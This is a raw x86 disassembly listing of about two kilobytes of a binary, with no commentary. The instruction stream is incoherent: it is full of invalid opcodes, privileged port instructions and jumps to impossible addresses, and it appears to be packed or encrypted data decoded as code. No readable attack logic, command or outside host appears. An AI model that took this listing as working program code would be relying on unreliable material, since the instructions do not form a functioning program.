  404202:	inc    esi
  404203:	or     BYTE PTR [edx-0x1d36f77e],dl
  404209:	enter  0x614c,0x97
  40420d:	dec    ebp
  40420e:	jne    0x404213
  404210:	cld    
  404211:	in     al,dx
  404212:	sti    
  404213:	sub    eax,0xd6b49cff
  404218:	popa   
  404219:	mov    dl,0x1f
  40421b:	out    0x60,al
  40421d:	inc    esi
  40421e:	mov    ds:0xb0da556,al
  404223:	jmp    0x9b5e4666
  404228:	and    dh,BYTE PTR [esi+edi*2+0x41d70190]
  40422f:	lahf   
  404230:	aam    0x54
  404232:	rol    edi,0x47
  404235:	cwde   
  404236:	pcmpgtd mm7,QWORD PTR [ebx-0x62ceb5f0]
  40423d:	sahf   
  40423e:	or     ecx,0x47
  404241:	retf   0x1e27
  404244:	pop    esi
  404245:	dec    esi
  404246:	and    al,0x1a
  404248:	fwait
  404249:	aas    
  40424a:	and    ch,BYTE PTR [esi-0x4b]
  40424d:	or     ebp,edx
  40424f:	mov    WORD PTR [ecx-0x28a7456f],fs
  404255:	imul   esp,ebx,0x5f7b6ef3
  40425b:	jp     0x404249
  40425d:	mov    eax,ds:0xa1a87ce2
  404262:	es scas al,BYTE PTR es:[di]
  404265:	ins    DWORD PTR es:[edi],dx
  404266:	(bad)  
  404267:	jecxz  0x404271
  404269:	add    DWORD PTR [eax-0x52],0x221cb8d7
  404270:	pop    ebp
  404271:	jmp    0x404291
  404273:	pop    ds
  404274:	int    0x1d
  404276:	cmp    al,0xeb
  404278:	pusha  
  404279:	cli    
  40427a:	push   ds
  40427b:	fcmovnb st,st(3)
  40427d:	faddp  st(4),st
  40427f:	and    eax,0x7da2ff86
  404284:	push   ss
  404285:	loop   0x4042ce
  404287:	adc    al,BYTE PTR [eax+ecx*1]
  40428a:	add    DWORD PTR [edx],ecx
  40428c:	mov    dh,0xa9
  40428e:	pop    ss
  40428f:	ss dec esi
  404291:	mov    dh,0x76
  404293:	mov    ebp,DWORD PTR [eax-0x47]
  404296:	add    al,BYTE PTR [ebx-0x4f9a1618]
  40429c:	adc    eax,esp
  40429e:	ret    
  40429f:	ss out 0xe8,al
  4042a2:	and    BYTE PTR [ebx],dl
  4042a4:	cmp    edi,DWORD PTR ds:0xb2cb5947
  4042aa:	or     ebp,edi
  4042ac:	shl    dl,cl
  4042ae:	jl     0x404308
  4042b0:	adc    DWORD PTR cs:[eax-0x483dfabb],eax
  4042b7:	lods   eax,DWORD PTR ds:[esi]
  4042b8:	lea    edx,[eax-0x6e]
  4042bb:	pop    esp
  4042bc:	ins    DWORD PTR es:[edi],dx
  4042bd:	adc    DWORD PTR [ecx-0x79e4b59e],eax
  4042c3:	jg     0x4042cd
  4042c5:	outs   dx,DWORD PTR ds:[esi]
  4042c6:	mov    ds:0x1a15100,eax
  4042cb:	retf   
  4042cc:	(bad)  
  4042cd:	dec    edi
  4042ce:	mov    al,0xb9
  4042d0:	sub    DWORD PTR [edx+0x47],0x5c
  4042d4:	jmp    0x40427b
  4042d6:	test   eax,0x1e2402f
  4042db:	push   ds
  4042dc:	(bad)  
  4042dd:	call   0xe117f3aa
  4042e2:	lock pop es
  4042e4:	add    al,0x7f
  4042e6:	fisub  DWORD PTR [edx-0x67]
  4042e9:	imul   eax,esp,0xffffffd9
  4042ec:	mov    esp,0x7659275
  4042f1:	dec    ecx
  4042f2:	sbb    BYTE PTR [edi+0x71],ch
  4042f5:	and    BYTE PTR [edi-0x1e6e669b],0xec
  4042fc:	add    BYTE PTR [edi+0x4b],ah
  4042ff:	mov    bh,0xae
  404301:	cmp    BYTE PTR [edi-0x5929e8d8],dl
  404307:	xor    BYTE PTR [edx-0x4b64208a],0xaf
  40430e:	sbb    eax,0x9a4362b6
  404313:	dec    ebx
  404314:	gs add esi,esp
  404317:	int    0x46
  404319:	cwde   
  40431a:	lahf   
  40431b:	fstp   QWORD PTR [edi]
  40431d:	mov    bl,0xc
  40431f:	daa    
  404320:	cmp    al,0x41
  404322:	into   
  404323:	popa   
  404324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404325:	sbb    ecx,edx
  404327:	jmp    0x56b60c8a
  40432c:	test   eax,0xa5b5da29
  404332:	add    al,0x9b
  404334:	pop    ebp
  404335:	aaa    
  404336:	test   eax,0xaaf0dd15
  40433b:	mov    eax,ds:0x12274df5
  404340:	push   edx
  404341:	inc    esp
  404342:	push   ecx
  404343:	xor    ebp,ebx
  404345:	jmp    0x4c072a74
  40434a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40434b:	stos   BYTE PTR es:[edi],al
  40434c:	xchg   ebp,eax
  40434d:	jecxz  0x40433c
  40434f:	outs   dx,BYTE PTR ds:[esi]
  404350:	pop    edx
  404351:	lds    edx,FWORD PTR [ebp-0x4a882738]
  404357:	int3   
  404358:	lods   al,BYTE PTR ds:[esi]
  404359:	mov    esi,0x6b217018
  40435e:	mov    bl,0xfc
  404360:	aam    0xcb
  404362:	mov    BYTE PTR [ebx],cl
  404364:	scas   al,BYTE PTR es:[edi]
  404365:	hlt    
  404366:	mov    dh,0xf5
  404368:	hlt    
  404369:	jne    0x4043d4
  40436b:	add    eax,0xfdd67880
  404370:	push   ebx
  404371:	loope  0x4043c1
  404373:	ret    
  404374:	sbb    al,0x5c
  404376:	adc    ebx,DWORD PTR [ebp-0x19]
  404379:	gs scas eax,DWORD PTR es:[edi]
  40437b:	(bad)  
  40437c:	jecxz  0x404306
  40437e:	and    bl,BYTE PTR [esi+ebx*2-0x4cbeb012]
  404385:	icebp  
  404386:	dec    edx
  404387:	hlt    
  404388:	inc    ebx
  404389:	sub    al,0xf
  40438b:	test   DWORD PTR [esi],edx
  40438d:	and    al,0x3c
  40438f:	add    eax,0x932c87b2
  404394:	mov    dh,0xd5
  404396:	shl    DWORD PTR [ebp-0x7ff2103c],cl
  40439c:	fisttp WORD PTR ds:0xb2e36d50
  4043a2:	aaa    
  4043a3:	loop   0x4043e5
  4043a5:	jns    0x404394
  4043a7:	push   eax
  4043a8:	adc    al,BYTE PTR [ecx-0x41e88a4a]
  4043ae:	stos   DWORD PTR es:[edi],eax
  4043af:	or     ch,dl
  4043b1:	div    DWORD PTR [eax]
  4043b3:	dec    ebp
  4043b4:	fcom   DWORD PTR [eax-0x6e]
  4043b7:	push   0xb9132a67
  4043bc:	jecxz  0x404388
  4043be:	mov    ch,BYTE PTR [edx]
  4043c0:	dec    ecx
  4043c1:	ficom  DWORD PTR [eax+0x34]
  4043c4:	test   bh,cl
  4043c6:	mov    ebx,0x40f72800
  4043cb:	leave  
  4043cc:	push   ss
  4043cd:	mov    eax,0xf8b118dd
  4043d2:	cmp    cl,BYTE PTR [ebx]
  4043d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043d5:	sahf   
  4043d6:	cld    
  4043d7:	add    al,0x4
  4043d9:	(bad)  
  4043db:	outs   dx,DWORD PTR ds:[esi]
  4043dc:	cmp    ecx,DWORD PTR [ebx+ecx*4]
  4043df:	ret    0xab1d
  4043e2:	mov    eax,ds:0x276f83ef
  4043e7:	jecxz  0x404380
  4043e9:	popf   
  4043ea:	xor    eax,0x20f5388f
  4043ef:	mov    eax,ds:0x58ddf5c2
  4043f4:	bound  ebx,QWORD PTR [edx]
  4043f6:	scas   al,BYTE PTR es:[edi]
  4043f7:	jae    0x404446
  4043f9:	mov    edi,0xf30e4b07
  4043fe:	(bad)  [ebp+0x50b1e0af]
  404404:	(bad)  [ecx]
  404406:	push   ebx
  404407:	xlat   BYTE PTR ds:[ebx]
  404408:	push   edi
  404409:	hlt    
  40440a:	out    dx,al
  40440b:	adc    ebx,DWORD PTR [edi+0x29e1003]
  404411:	push   ecx
  404412:	arpl   WORD PTR [ecx-0x3d2073a9],ax
  404418:	cmp    ebx,edi
  40441a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40441b:	pop    esp
  40441c:	mov    esi,0x22589bf2
  404421:	data16 (bad) 
  404423:	pop    esp
  404424:	jae    0x40443c
  404426:	es push eax
  404428:	ret    
  404429:	shl    BYTE PTR [esi+0x4eb11ec],0xd7
  404430:	pop    ds
  404431:	xchg   BYTE PTR [eax-0xa],dh
  404434:	into   
  404435:	jp     0x404496
  404437:	into   
  404438:	adc    BYTE PTR [edx+0x6644f1a4],dh
  40443e:	jbe    0x40442e
  404440:	shl    DWORD PTR [edx+0x3b],1
  404443:	mov    eax,0xeeac0bff
  404448:	sar    BYTE PTR ds:0xd3e1a1a8,1
  40444e:	or     al,0x45
  404450:	in     al,0x87
  404452:	icebp  
  404453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404454:	push   0xfffffff0
  404456:	and    BYTE PTR [eax],bl
  404458:	arpl   WORD PTR [edi],sp
  40445a:	test   eax,0xda5cca09
  40445f:	cdq    
  404460:	mov    ebx,0x5c12b616
  404465:	mov    dh,0xce
  404467:	(bad)  
  404468:	arpl   WORD PTR [ecx],cx
  40446a:	jno    0x404439
  40446c:	adc    edi,ecx
  40446e:	lahf   
  40446f:	sbb    esi,DWORD PTR [ebx]
  404471:	sbb    dl,BYTE PTR [edx+0x3c3ba77]
  404477:	jle    0x404480
  404479:	inc    edi
  40447a:	add    al,BYTE PTR [edx-0x29]
  40447d:	(bad)  
  40447e:	out    dx,eax
  40447f:	adc    ebx,esp
  404481:	mov    al,ds:0xac140890
  404486:	push   0x40
  404488:	mov    cl,0x1a
  40448a:	inc    ebp
  40448b:	mov    ebx,0x8525aa29
  404490:	push   ss
  404491:	inc    edx
  404492:	rol    DWORD PTR [ecx],0x53
  404495:	test   al,ch
  404497:	cmp    BYTE PTR [esi],dl
  404499:	mov    ebx,0x50be7847
  40449e:	lahf   
  40449f:	jl     0x4044b8
  4044a1:	ret    0xc464
  4044a4:	xchg   esi,esp
  4044a6:	or     eax,0x88b56218
  4044ab:	push   0x15
  4044ad:	rol    BYTE PTR [eax+0x47],0xe1
  4044b1:	inc    edi
  4044b2:	scas   eax,DWORD PTR es:[edi]
  4044b3:	sbb    eax,0x2fe42962
  4044b8:	into   
  4044b9:	popf   
  4044ba:	xchg   esp,eax
  4044bb:	add    ebp,DWORD PTR [esi+edi*4-0x35a0497f]
  4044c2:	jge    0x4044a3
  4044c4:	fcom   QWORD PTR [eax-0x760eb7cc]
  4044ca:	loop   0x40446f
  4044cc:	ins    BYTE PTR es:[edi],dx
  4044cd:	repnz (bad) 
  4044cf:	in     eax,dx
  4044d0:	in     eax,dx
  4044d1:	(bad)
  4044d4:	arpl   WORD PTR [eax-0x6eb35ca0],si
  4044da:	fiadd  DWORD PTR [esi+0x52eb539a]
  4044e0:	mov    ebp,0x1cefb34a
  4044e5:	pop    esi
  4044e6:	icebp  
  4044e7:	sub    DWORD PTR [esi+ecx*2+0x7a6bfbff],ebx
  4044ee:	lahf   
  4044ef:	push   es
  4044f0:	stos   DWORD PTR es:[edi],eax
  4044f1:	cmp    BYTE PTR [ecx-0x57048be5],ch
  4044f7:	mov    cl,0x4c
  4044f9:	pop    ebx
  4044fa:	push   edx
  4044fb:	xchg   edi,eax
  4044fc:	mov    ds:0xb4a40e9f,al
  404501:	ret    0x2229
  404504:	mov    dh,0x12
  404506:	jg     0x40456e
  404508:	or     dh,BYTE PTR [ecx-0x43937d51]
  40450e:	outs   dx,DWORD PTR ds:[esi]
  40450f:	or     DWORD PTR [edx],edi
  404511:	push   0x37784020
  404516:	xchg   DWORD PTR [eax+ebx*4],esi
  404519:	dec    esi
  40451a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40451b:	lds    edi,FWORD PTR [esi-0x43992a8e]
  404521:	sbb    eax,0xd18b54ea
  404526:	xor    DWORD PTR [edx-0x44796a0a],ebp
  40452c:	test   DWORD PTR [edi+0x5f],esp
  40452f:	mov    esi,0x4fa16bcf
  404534:	or     eax,0x72055bb4
  404539:	lods   al,BYTE PTR ds:[esi]
  40453a:	sbb    ah,BYTE PTR [edi+0x10]
  40453d:	paddd  mm0,mm2
  404540:	xor    al,0x1f
  404542:	repz push 0xd77af8d3
  404548:	and    bh,dh
  40454a:	xchg   esp,eax
  40454b:	hlt    
  40454c:	mov    WORD PTR [eax+edx*2],fs
  40454f:	test   al,0xcb
  404551:	xor    ebx,DWORD PTR [esi]
  404553:	push   edx
  404554:	and    al,0xea
  404556:	retf   
  404557:	test   DWORD PTR [ebx+0x53],esp
  40455a:	cmp    BYTE PTR [edx-0x7],ah
  40455d:	mov    cl,0x9b
  40455f:	push   es
  404560:	dec    ebx
  404561:	push   edi
  404562:	pop    esp
  404563:	mov    al,0x6d
  404565:	fadd   st(3),st
  404567:	cmp    cl,BYTE PTR [edi+0x37a0dce2]
  40456d:	leave  
  40456e:	cld    
  40456f:	test   DWORD PTR ds:0x26be05c1,0x2540aa5e
  404579:	scas   al,BYTE PTR es:[edi]
  40457a:	inc    esi
  40457b:	call   0xd31ecca2
  404580:	dec    eax
  404581:	mov    es,ebx
  404583:	adc    ch,BYTE PTR [esi+esi*2+0x330d133c]
  40458a:	repz pushf 
  40458c:	push   edi
  40458d:	ss test al,0xc9
  404590:	xor    dh,ah
  404592:	push   0x78
  404594:	adc    al,0xf2
  404596:	pop    esp
  404597:	or     DWORD PTR [edx+ebx*4-0x17],esp
  40459b:	ud1    esi,DWORD PTR [edi-0x7c103d96]
  4045a2:	out    dx,al
  4045a3:	dec    BYTE PTR [edi-0x89f9507]
  4045a9:	cmc    
  4045aa:	aad    0x59
  4045ac:	or     BYTE PTR ds:0x75eed6d9,ch
  4045b2:	xchg   edi,eax
  4045b3:	push   ds
  4045b4:	mov    WORD PTR [eax],?
  4045b6:	or     DWORD PTR [eax],0xffffffce
  4045b9:	lock mov dh,0x9
  4045bc:	jle    0x404605
  4045be:	push   0xffffff94
  4045c0:	in     al,0xf4
  4045c2:	icebp  
  4045c3:	or     DWORD PTR [ecx],esi
  4045c5:	fld    DWORD PTR [ecx+0xb23a99b]
  4045cb:	dec    eax
  4045cc:	mov    eax,ds:0xa44e6eef
  4045d1:	mov    ebp,0xc88075a2
  4045d6:	mov    BYTE PTR [esi+0x7cae265f],ch
  4045dc:	inc    edi
  4045dd:	pop    esi
  4045de:	int    0x6a
  4045e0:	out    0x60,al
  4045e2:	iret   
  4045e3:	jp     0x4045da
  4045e5:	retf   0xb3ca
  4045e8:	sbb    ah,BYTE PTR [ecx+0x7]
  4045eb:	xchg   esp,eax
  4045ec:	retf   0x5d90
  4045ef:	xchg   esp,eax
  4045f0:	or     esi,DWORD PTR [eax+0x55987223]
  4045f6:	xor    al,0xb8
  4045f8:	pop    ecx
  4045f9:	push   eax
  4045fa:	mov    edi,0x6b3ea35f
  4045ff:	jae    0x4045ed
  404601:	pop    esp
  404602:	mov    ds:0x5bea8298,al
  404607:	loopne 0x40460d
  404609:	lahf   
  40460a:	dec    ebx
  40460b:	jb     0x40464d
  40460d:	bound  ecx,QWORD PTR [ebx]
  40460f:	pop    ss
  404610:	retf   
  404611:	push   edi
  404612:	cmp    DWORD PTR [edx],edi
  404614:	xor    ch,BYTE PTR [edx+0x55d769a]
  40461a:	lds    esp,FWORD PTR ds:0xa2438ed2
  404620:	adc    BYTE PTR [esi],0x51
  404623:	fsub   st,st(2)
  404625:	(bad)  
  404626:	xchg   dl,dh
  404628:	push   esp
  404629:	xor    dh,BYTE PTR [ebx+0x21]
  40462c:	das    
  40462d:	push   edx
  40462e:	jle    0x4045c2
  404630:	xor    DWORD PTR [edi],0x3352f5ff
  404636:	sti    
  404637:	stc    
  404638:	scas   al,BYTE PTR es:[edi]
  404639:	cmp    edx,DWORD PTR [ebp-0x1a878750]
  40463f:	or     al,0x11
  404641:	mov    ah,0x6a
  404643:	jle    0x40463a
  404645:	les    ebp,FWORD PTR [edx]
  404647:	out    dx,eax
  404648:	out    dx,al
  404649:	out    0x65,eax
  40464b:	mov    cl,0x15
  40464d:	clc    
  40464e:	push   esi
  40464f:	aas    
  404650:	stos   BYTE PTR es:[edi],al
  404651:	add    al,0xfa
  404653:	mov    al,ds:0x986ea279
  404658:	aas    
  404659:	sub    eax,0x80c70edb
  40465e:	push   0x4bc5272
  404663:	dec    edi
  404664:	push   ebx
  404665:	cmp    DWORD PTR [eax+0x69],esi
  404668:	imul   eax,DWORD PTR [ebx-0x65abe35d],0x395866ff
  404672:	(bad)  
  404673:	lahf   
  404674:	pop    esi
  404675:	xor    ah,BYTE PTR [ebx+0x7195e991]
  40467b:	pop    edx
  40467c:	adc    bl,ah
  40467e:	cmp    DWORD PTR [edi-0x77],ecx
  404681:	dec    ebx
  404682:	add    eax,0xafbec8aa
  404687:	les    esi,FWORD PTR [edi+0x40]
  40468a:	adc    dh,BYTE PTR [ecx]
  40468c:	pop    edi
  40468d:	pop    ds
  40468e:	lods   eax,DWORD PTR ds:[esi]
  40468f:	std    
  404690:	test   ebx,0xbcf168e4
  404696:	ret    
  404697:	stos   DWORD PTR es:[edi],eax
  404698:	scas   eax,DWORD PTR es:[edi]
  404699:	test   al,0x72
  40469b:	add    bh,BYTE PTR [edx+ecx*1-0x5750f70d]
  4046a2:	dec    ebx
  4046a3:	dec    ebp
  4046a4:	xchg   ecx,eax
  4046a5:	shr    BYTE PTR [edi],0x53
  4046a8:	leave  
  4046a9:	xor    BYTE PTR [eax-0x7d5f7c],dl
  4046af:	ins    BYTE PTR es:[edi],dx
  4046b0:	ss aaa 
  4046b2:	mov    ecx,0x59eea60d
  4046b7:	dec    edi
  4046b8:	(bad)  
  4046b9:	cmp    eax,DWORD PTR [ebx]
  4046bb:	jb     0x404739
  4046bd:	or     BYTE PTR [edx],dh
  4046bf:	imul   edx,ebp,0x6433de1d
  4046c5:	sub    edx,DWORD PTR [edx-0x33]
  4046c8:	sub    bh,BYTE PTR [eax-0x6f]
  4046cb:	fidiv  DWORD PTR [edx-0x497adf23]
  4046d1:	jmp    0x4046fc
  4046d3:	or     ebx,ebp
  4046d5:	pop    ebp
  4046d6:	dec    ebx
  4046d7:	cmp    esp,DWORD PTR [eax+0x4a]
  4046da:	pop    ss
  4046db:	out    0x13,eax
  4046dd:	add    DWORD PTR [ebx+esi*4],ebp
  4046e0:	scas   al,BYTE PTR es:[edi]
  4046e1:	pop    ss
  4046e2:	repz cmp bh,bh
  4046e5:	call   0x21f2c7ec
  4046ea:	(bad)  
  4046eb:	imul   esi,esi,0x6be22f
  4046f1:	test   BYTE PTR [edi-0x11],ah
  4046f4:	jge    0x4046c5
  4046f6:	icebp  
  4046f7:	(bad)  [ebx+esi*1+0x25]
  4046fb:	cwde   
  4046fc:	sbb    DWORD PTR [edx],0x4021de68
  404702:	sub    DWORD PTR [esi+0x370a2da9],0xffffffce
  404709:	xor    al,0x1f
  40470b:	loop   0x404780
  40470d:	and    esp,DWORD PTR [edi-0x3da39f8f]
  404713:	adc    BYTE PTR [ebp-0x5a],0xa9
  404717:	jns    0x404775
  404719:	call   0x13a2dd33
  40471e:	mov    bl,0x6d
  404720:	aaa    
  404721:	in     al,0xf0
  404723:	jb     0x404705
  404725:	icebp  
  404726:	dec    ebx
  404727:	pop    ebp
  404728:	scas   al,BYTE PTR es:[edi]
  404729:	popf   
  40472a:	mov    eax,ds:0xa46ae061
  40472f:	mov    ch,0x49
  404731:	jmp    0x84682d42
  404736:	xchg   esi,eax
  404737:	add    BYTE PTR [esi+0x14],0x93
  40473b:	into   
  40473c:	je     0x4047ad
  40473e:	add    eax,0xcb4a71e1
  404743:	retf   0xd051
  404746:	aad    0xed
  404748:	jle    0x404799
  40474a:	and    bl,BYTE PTR [eax+edi*4-0x5a]
  40474e:	inc    edi
  40474f:	mov    ss,esi
  404751:	mov    ecx,0x46dedb47
  404756:	dec    edx
  404757:	mov    dh,0xd
  404759:	add    al,0x66
  40475b:	adc    eax,0xcd49bfc9
  404760:	cwde   
  404761:	jl     0x404701
  404763:	lock outs dx,DWORD PTR ds:[esi]
  404765:	es dec ecx
  404767:	push   eax
  404768:	push   0x910fea66
  40476d:	xchg   ebp,eax
  40476e:	push   ss
  40476f:	mov    al,ds:0x75da46f2
  404774:	sbb    DWORD PTR [edi],edx
  404776:	inc    BYTE PTR [eax-0x59]
  404779:	pop    es
  40477a:	rcl    DWORD PTR [ecx-0x52],cl
  40477d:	out    dx,eax
  40477e:	lahf   
  40477f:	xor    al,0x0
  404781:	and    eax,DWORD PTR fs:[edi]
  404784:	dec    ebp
  404785:	jno    0x404749
  404787:	add    al,BYTE PTR [edx+0x2ce3ae7b]
  40478d:	inc    esi
  40478e:	aaa    
  40478f:	mov    esi,0xa3b0a99c
  404794:	dec    edx
  404795:	aas    
  404796:	mov    ah,0xaa
  404798:	cmp    al,0x49
  40479a:	daa    
  40479b:	mov    al,0xbe
  40479d:	mov    ch,0xd9
  40479f:	in     al,0x58
  4047a1:	outs   dx,DWORD PTR ds:[esi]
  4047a2:	or     BYTE PTR [ecx+0x35e5d453],ch
  4047a8:	cmc    
  4047a9:	and    edi,ecx
  4047ab:	mov    dh,0x34
  4047ad:	push   edx
  4047ae:	je     0x4047b8
  4047b0:	loope  0x40478b
  4047b2:	test   al,0xae
  4047b4:	in     eax,dx
  4047b5:	cmp    al,0xa7
  4047b7:	shl    BYTE PTR [edi-0x28],cl
  4047ba:	inc    edi
  4047bc:	mov    BYTE PTR [edi+0x6d0ac90e],ch
  4047c2:	mov    bh,0xa8
  4047c4:	and    BYTE PTR cs:[edx],dl
  4047c7:	mov    DWORD PTR [eax+0x8],ebp
  4047ca:	daa    
  4047cb:	mov    ds:0xee7b98a,al
  4047d0:	ds stos DWORD PTR es:[edi],eax
  4047d2:	out    0x20,eax
  4047d4:	gs addr16 mov edi,0x9c7e110b
  4047db:	repz (bad) 
  4047dd:	call   0x59ae03be
  4047e2:	inc    ebx
  4047e3:	adc    eax,0xdcae9350
  4047e8:	pop    ebp
  4047e9:	imul   ebx,DWORD PTR [ebp+0x7],0xffffffbe
  4047ed:	push   ecx
  4047ee:	push   ds
  4047ef:	mov    BYTE PTR [esi],0x84
  4047f2:	jo     0x404811
  4047f4:	or     eax,0x8ed3938f
  4047f9:	xchg   esp,eax
  4047fa:	ret    
  4047fb:	repnz dec ebp
  4047fd:	fcom   st(7)
  4047ff:	inc    esp
  404800:	test   DWORD PTR [edi+0xf7dbdc0],ebp
  404806:	sbb    ecx,esi
  404808:	push   esp
  404809:	mov    bl,0xfa
  40480b:	xchg   esp,eax
  40480c:	js     0x404877
  40480e:	aas    
  40480f:	sbb    BYTE PTR [esi-0x27bd75df],ch
  404815:	pop    eax
  404816:	into   
  404817:	lahf   
  404818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404819:	loopne 0x404892
  40481b:	in     eax,0x58
  40481d:	jae    0x4047eb
  40481f:	fmul   QWORD PTR [eax+ebp*8+0x37]
  404823:	setle  BYTE PTR [eax+ebx*8]
  404827:	fld    QWORD PTR [edi+0x5fb0ac62]
  40482d:	ss cmp al,0x5f
  404830:	in     al,dx
  404831:	clc    
  404832:	xor    edx,edi
  404834:	pop    ebp
  404835:	shl    DWORD PTR [ecx*4-0x7932658e],0xc2
  40483d:	mov    DWORD PTR [edi-0x2c9d5fb4],edi
  404843:	and    eax,0x496c7a99
  404848:	xchg   esi,eax
  404849:	jns    0x4047d9
  40484b:	je     0x4047e6
  40484d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40484e:	mov    ds:0x454c8297,al
  404853:	retf   0x856c
  404856:	loop   0x4047e7
  404858:	rol    DWORD PTR ds:0x7a9510d,1
  40485e:	pop    ebp
  40485f:	and    DWORD PTR [edx],ebp
  404861:	mov    ds:0x9bda9256,eax
  404866:	fmulp  st(5),st
  404868:	sbb    al,0xd6
  40486a:	pop    esi
  40486b:	js     0x4048b4
  40486d:	xchg   BYTE PTR [edx+0x4ff594f5],al
  404873:	pushf  
  404874:	add    eax,0xeedfb9e1
  404879:	test   eax,0x76e229a8
  40487e:	jae    0x40485f
  404880:	popa   
  404881:	push   ecx
  404882:	das    
  404883:	mov    esi,0x5615b63a
  404888:	fdivrp st(7),st
  40488a:	sub    al,0x10
  40488c:	(bad)  
  40488e:	daa    
  40488f:	mov    ds:0x184c045d,al
  404894:	nop
  404895:	aaa    
  404896:	mov    ch,al
  404898:	xchg   edx,eax
  404899:	xchg   edx,eax
  40489a:	push   ss
  40489b:	rol    BYTE PTR [edx+0x16],1
  40489e:	scas   al,BYTE PTR es:[edi]
  40489f:	and    BYTE PTR [edx],al
  4048a1:	div    ah
  4048a3:	ja     0x4048a0
  4048a5:	repnz fimul WORD PTR [ebx-0x585fdd78]
  4048ac:	pop    ds
  4048ad:	or     ah,dh
  4048af:	add    DWORD PTR [ecx+0x46],ebx
  4048b2:	cmc    
  4048b3:	push   ebp
  4048b4:	xchg   esp,edx
  4048b6:	mov    WORD PTR [edi],ss
  4048b8:	xchg   ebp,eax
  4048b9:	inc    ebx
  4048ba:	test   al,0x33
  4048bc:	adc    eax,0x3b4d9ebd
  4048c1:	cmp    bl,BYTE PTR [ebx-0x12b52d82]
  4048c7:	inc    ecx
  4048c8:	push   edi
  4048c9:	xchg   ebx,eax
  4048ca:	xchg   ebx,eax
  4048cb:	aam    0xf2
  4048cd:	and    ah,BYTE PTR [esi+0x21]
  4048d0:	lds    esp,FWORD PTR [ecx-0x45]
  4048d3:	cmp    al,BYTE PTR [ebx-0x30]
  4048d6:	mov    ebp,0xaaa6c15e
  4048db:	out    dx,al
  4048dc:	lds    esp,FWORD PTR [ecx-0x4f]
  4048df:	test   al,0x6e
  4048e1:	mov    edx,0x5c74e87f
  4048e6:	pop    esp
  4048e7:	add    eax,0xb1458ceb
  4048ec:	mov    bl,0xf8
  4048ee:	add    al,0x1b
  4048f0:	test   BYTE PTR ds:0xed16919d,bl
  4048f6:	jmp    0x404962
  4048f8:	std    
  4048f9:	push   edi
  4048fa:	std    
  4048fb:	mov    edx,0x823640a6
  404900:	pop    esi
  404901:	in     al,dx
  404902:	mov    bl,0xe3
  404904:	adc    BYTE PTR [ebx+ebx*1],dh
  404907:	mov    eax,0xa646a1d1
  40490c:	imul   edi,DWORD PTR [esi+0x11],0x63
  404910:	call   0x7d034c68
  404915:	xor    edx,DWORD PTR [edi+0x2a]
  404918:	cmp    bh,dl
  40491a:	test   BYTE PTR [ebp-0x34173a1c],bl
  404920:	sub    ch,cl
  404922:	and    al,0x64
  404924:	mov    bl,BYTE PTR [edx]
  404926:	add    al,0x7f
  404928:	in     eax,dx
  404929:	addr16 sub ch,cl
  40492c:	sub    eax,0x3336d14f
  404931:	cs mov esi,0x733111c3
  404937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404938:	xor    ebx,DWORD PTR [edi+0x471b42b6]
  40493e:	jno    0x4049ba
  404940:	cwde   
  404941:	mov    ebx,0x229d4eb1
  404946:	aad    0x32
  404948:	cmp    ebp,DWORD PTR [esi+0x71ab7218]
  40494e:	test   eax,0xf940caec
  404953:	leave  
  404954:	mov    dl,0x68
  404956:	mov    BYTE PTR [ebp+0x4209ca98],bh
  40495c:	mov    cl,BYTE PTR ds:[edi+0x76]
  404960:	or     BYTE PTR gs:[ebx-0x37],cl
  404964:	bound  esp,QWORD PTR [ebx-0x3b]
  404967:	jge    0x4048f6
  404969:	pop    ss
  40496a:	xor    al,0xc7
  40496c:	cli    
  40496d:	jae    0x404917
  40496f:	daa    
  404970:	bound  eax,QWORD PTR [eax+0x63]
  404973:	sahf   
  404974:	ret    
  404975:	add    BYTE PTR [ebp+0x40],0xb
  404979:	pusha  
  40497a:	int    0xd7
  40497c:	pop    ecx
  40497d:	mov    esp,DWORD PTR [esi+eax*4-0x7274de3d]
  404984:	popa   
  404985:	mov    bl,0x13
  404987:	xchg   ebx,eax
  404988:	dec    eax
  404989:	mov    bh,0x5c
  40498b:	inc    edi
  40498c:	cmp    eax,0x76ca9c10
  404991:	fld    QWORD PTR [ebp+0x672c5d81]
  404997:	int    0x15
  404999:	fstp   DWORD PTR [ecx]
  40499b:	mov    cl,0xe8
  40499d:	(bad)  
  40499e:	enter  0x8b8a,0x63
  4049a2:	mov    bl,0x2f
  4049a4:	pop    esi
  4049a5:	jl     0x404930
  4049a7:	xor    cx,bx
  4049aa:	mov    esi,0x139b58c6
  4049af:	and    eax,0xb31e0e12
  4049b4:	push   es
  4049b5:	pop    ss
  4049b6:	pop    ds
  4049b7:	adc    BYTE PTR [edi+0x4400afe8],al
  4049bd:	jbe    0x4049bf
  4049bf:	leave  
  4049c0:	je     0x404994
  4049c2:	and    al,0xf1
  4049c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c5:	push   esp
  4049c6:	inc    ebx
  4049c7:	hlt    
  4049c8:	pop    ebp
  4049c9:	mov    edi,0x46954f85
  4049ce:	sub    bh,BYTE PTR [ebp-0x191b744f]
  4049d4:	ins    DWORD PTR es:[edi],dx
  4049d5:	fwait
  4049d6:	or     BYTE PTR [ebp+0x35],bl
  4049d9:	inc    edx
  4049da:	cmp    eax,0x2dfa9a1b
  4049df:	cdq    
  4049e0:	lds    esp,FWORD PTR [ebx]
  4049e2:	es fs xor al,0x5f
  4049e6:	sub    DWORD PTR [edx+0x65],edi
  4049e9:	enter  0x69d5,0xd4
  4049ed:	jle    0x404a35
  4049ef:	push   esi
  4049f0:	fld    st(4)
  4049f2:	in     eax,0xbf
  4049f4:	sub    BYTE PTR [edi],0xa4
  4049f7:	inc    edi
  4049f8:	add    eax,0x642b0427
  4049fd:	sub    ecx,DWORD PTR [eax+esi*4]
  404a00:	xchg   edi,eax
  404a01:	inc    eax
  404a02:	or     eax,0xe017a122
  404a07:	or     DWORD PTR [edi+0xe],esi
  404a0a:	popf   
  404a0b:	xlat   BYTE PTR ds:[ebx]
  404a0c:	ret    
  404a0d:	popf   
